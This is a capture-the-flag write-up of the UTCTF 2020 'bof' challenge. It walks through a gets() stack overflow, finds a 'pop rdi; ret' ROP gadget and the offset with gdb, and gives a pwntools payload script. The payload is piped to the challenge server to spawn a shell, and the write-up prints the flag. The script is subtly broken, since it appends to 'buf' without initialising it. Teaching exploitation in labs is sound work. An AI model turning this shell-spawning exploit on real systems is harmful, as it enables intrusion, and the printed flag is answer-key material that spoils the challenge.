## bof

* **Category:**  Binary Exploitation
* **Points:** 50

### Challenge
```
nc binary.utctf.live 9002

```
[pwnable](pwnable)

### Solution
* **Author(s):** b0uldrr 
* **Date:** 08 March 2020

We're given a remote server (nc binary.utctf.live 9002) which prompts to enter a string, accepts some input, and then exits. We're also provided with the executable file which is running on the server (pwnable) for download.

Running the file command on the program shows it is an ELF 64-bit LSB executable:

```
tmp@localhost:~/ctf/utctf/bof$ file pwnable
pwnable: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=017761d89d9e70fa132c5dca9e2de20a44672698, not stripped
```

I open the executable in Ghidra. The program has a main function which allocates 112 bytes for our string input.

```
undefined8 main(void)
{
  char local_78 [112];
  
  puts("I really like strings! Please give me a good one!");
  gets(local_78);
  puts("Thanks for the string");
  return 1;
}
```

There was also a get_flag function, which takes a single input parameter, compares it the value 0xdeadbeef, and if it is a match then it spawns a shell.

```
void get_flag(int param_1)

{
  char *local_18;
  undefined8 local_10;
  
  if (param_1 == -0x21524111) {
    local_18 = "/bin/sh";
    local_10 = 0;
    execve("/bin/sh",&local_18,(char **)0x0);
  }
  return;
}
```

This was obviously the function that we need to run but because it isn't called from any other function we have no way of executing it in the normal flow of the program.

Fortunately, the gets() call in the main function is vulnerable to a buffer overflow attack because it doesn't limit the number of bytes that we write to the input buffer. We can overflow the 112 allocated bytes to overwrite the return address on the stack. Below is a rough diagram of our stack, remembering that the stack grows downwards to lower addresses but local variables are filled upwards towards higher addresses. We can write to the allocated 112 bytes for our local variable, then 8 bytes over the saved base pointer address and then the next 8 bytes we write will be the return address.

```
        higher addresses
|              ...             |
|        previous frame        |
+------------------------------+    --+
|        return address        |      |--- The return address we need to overwrite to point to get_flag
+------------------------------+    --+
|          saved RBP           |
+------------------------------+    --+
|           RBP - 8            |      |
+------------------------------+      |
              ...                     |--- The local variable buffer stack space we can overflow
+------------------------------+      |
|           RBP - 14           |      |
+------------------------------+    --+
         lower addresses
```

Using objdump, I found the address of get_flag function was 0x4005ea.

```
tmp@localhost:~/ctf/utctf/bof$ objdump -d pwnable | less
```

```
00000000004005ea <get_flag>:
  4005ea:       55                      push   %rbp
  4005eb:       48 89 e5                mov    %rsp,%rbp
  4005ee:       48 83 ec 20             sub    $0x20,%rsp
  4005f2:       89 7d ec                mov    %edi,-0x14(%rbp)
  4005f5:       81 7d ec ef be ad de    cmpl   $0xdeadbeef,-0x14(%rbp)
  4005fc:       75 2a                   jne    400628 <get_flag+0x3e>
  4005fe:       48 c7 45 f0 00 07 40    movq   $0x400700,-0x10(%rbp)
  400605:       00 
  400606:       48 c7 45 f8 00 00 00    movq   $0x0,-0x8(%rbp)
  40060d:       00 
  40060e:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  400612:       48 8d 4d f0             lea    -0x10(%rbp),%rcx
  400616:       ba 00 00 00 00          mov    $0x0,%edx
  40061b:       48 89 ce                mov    %rcx,%rsi
  40061e:       48 89 c7                mov    %rax,%rdi
  400621:       e8 6a fe ff ff          callq  400490 <execve@plt>
  400626:       eb 01                   jmp    400629 <get_flag+0x3f>
  400628:       90                      nop
  400629:       c9                      leaveq 
  40062a:       c3                      retq   
  40062b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
```

With this address we can now overwrite the return address on the stack with the address of the get_flag function but we also need to pass it the parameter value of 0xdeadbeef or the function will just exit without spawning a shell. Because this is a 64bit executable, function parameters are passed using registers (as opposed to 32 bit programs, where parameters are pushed to the stack). The first parameter is placed in RDI, the second in RSI, the third in RDX, and then RCX, R8 and R9. Only the 7th argument and onwards are passed on the stack. We need a way to push the value of 0xdeadbeef into the RDI register before calling the get_flag function.

To do this we will need to execute a "return-oriented programming" (ROP) chain attack, where we will call and execute machine code sequences that are already present in the program. These sequences of codes are called "gadgets", and we need one that pops a value to RDI (which we will set to be 0xdeadbeef) and then returns the flow back to our stack again.

I ran a program called ROPgadget on the pwnable executable to do this.

```
tmp@localhost:~/ctf/utctf/bof$ ROPgadget --ropchain --binary pwnable > rop.txt
```

The resulting text file (rop.txt) listed a lot of different ROP gadgets found in our program, and among those was the one I was looking for:

```
0x0000000000400693 : pop rdi ; ret
```
So if we overflow the stack to set the return address to point to 0x400693, the program will jump to this address in the code, pop the next value on the stack into the RDI register (and because we control the stack, we can make sure that value is 0xdeadbeef), and then return to the next value on the stack, which we will set to the address of the get_flag function (0x4005ea)

The last thing we need to do is to confirm exactly how many bytes we need to write before we will start overwriting the return address on the stack. There are a few ways to do this but the easiest is to use a long De Bruijn sequence to overflow the buffer and then search for that pattern offset in our overflowed return address buffer.

Create the pattern in GDB Peda and then save the output in a text file (in.txt):

```
gdb-peda$ pattern_create 400 in.txt
Writing pattern of 400 chars to filename "in.txt"
```

Run the pwnable program in gdb, using the De Bruijn sequence as an input:

```
gdb-peda$ r < in.txt
Starting program: /home/tmp/ctf/utctf/bof/pwnable < in.txt
I really like strings! Please give me a good one!
Thanks for the string

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x0 
RCX: 0x7ffff7ee3904 (<__GI___libc_write+20>:    cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7fb4580 --> 0x0 
RSI: 0x6022a0 ("Thanks for the string\n Please give me a good one!\n")
RDI: 0x0 
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffe158 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA"...)
RIP: 0x4005e9 (<main+51>:       ret)
R8 : 0x16 
R9 : 0x7fffffffe140 ("6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA"...)
R10: 0x60298f --> 0x0 
R11: 0x246 
R12: 0x4004c0 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe230 ("lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y")
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005de <main+40>:  call   0x400470 <puts@plt>
   0x4005e3 <main+45>:  mov    eax,0x1
   0x4005e8 <main+50>:  leave  
=> 0x4005e9 <main+51>:  ret    
   0x4005ea <get_flag>: push   rbp
   0x4005eb <get_flag+1>:       mov    rbp,rsp
   0x4005ee <get_flag+4>:       sub    rsp,0x20
   0x4005f2 <get_flag+8>:       mov    DWORD PTR [rbp-0x14],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe158 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA"...)
0008| 0x7fffffffe160 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%O"...)
0016| 0x7fffffffe168 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%"...)
0024| 0x7fffffffe170 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA"...)
0032| 0x7fffffffe178 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%S"...)
0040| 0x7fffffffe180 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%"...)
0048| 0x7fffffffe188 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA"...)
0056| 0x7fffffffe190 ("AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%W"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004005e9 in main ()
```

The program overflowed and caused a segmentation fault. Let's check the value of the instruction pointer.

```
gdb-peda$ x/wx $rsp
0x7fffffffe158: 0x3941416a
```

We wrote the value 0x3941416a to the instruction pointer and the segmenation fault was casued because this isn't a valid address in our code. Let's find the offset of that value in our input pattern file:

```
gdb-peda$ pattern_offset 0x3941416a
960577898 found at offset: 120
```

Our offset is at 120 bytes. So we need to write 120 bytes of junk before we overflow the return address. Now we can write a script to build our payload string. We'll output the string to a file that we can direct into the pwnable program. Note that I use the pwn p64 function to pack the addresses in 64-bit Little Endian format.

```
#!/usr/bin/python3
import pwn

buf += b"A"*120                        # send 120 bytes of junk to fill up the input buffer and the saved base pointer
buf += pwn.p64(0x400693)               # call our "pop rdi; ret;" gadget
buf += pwn.p64(0xdeadbeef)             # put 0xdeadbeef on the stack so that it will be popped into rdi by our gadget
buf += pwn.p64(0x4005ea)               # call the get_flag function

f = open("payload.hex", "wb")          # write our bytes to a file that we can inject into the pwnable program
f.write(buf)
```

With our payload built, the last thing to do is inject it into the pwnable program on the remote server. Note that we need to include the hyphen after "payload.hex" so that the program doesn't automatically return after our payload.

```
tmp@localhost:~/ctf/utctf/bof$ cat payload.hex - | nc binary.utctf.live 9002
I really like strings! Please give me a good one!

Thanks for the string
ls
flag.txt
cat flag.txt
utflag{thanks_for_the_string_!!!!!!}
```
Once we have our shell, the flag was in a text file "flag.txt" in the same directory.

**Flag** 
```
utflag{thanks_for_the_string_!!!!!!}
```
